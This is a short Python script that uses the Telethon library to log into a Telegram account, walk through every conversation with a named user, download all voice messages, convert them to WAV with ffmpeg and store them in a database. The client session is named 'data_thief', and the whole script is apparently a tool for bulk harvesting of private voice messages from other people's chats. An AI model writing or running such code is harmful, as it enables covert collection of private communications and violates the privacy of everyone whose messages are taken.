from telethon import TelegramClient
from conf import api_hash, api_id, bot_token
import subprocess
from database import Database


API_HASH = api_hash
API_ID = api_id
BOT_TOKEN = bot_token


client = TelegramClient("data_thief", API_ID, API_HASH)

async def main():
    
    users = []
    audio_list = []

    counter = 0

    async for dialog in client.iter_dialogs():
        if dialog.entity.username != None:
            users.append(dialog.entity.username)

    for user in users:
        async for mess in client.iter_messages(user):
            try:
                if mess.media is not None:
                    if mess.media.document.mime_type == "audio/ogg":
                        audio = await mess.download_media()
                        audio_list.append(audio)
            except Exception:
                continue
    
    for name in audio_list:
        destination_file = f"audio_message_{counter}.wav"
        counter += 1
        process = subprocess.run(['ffmpeg', '-i', name, destination_file])
        Database.insert_BLOB(counter, destination_file)


with client:
    client.loop.run_until_complete(main())
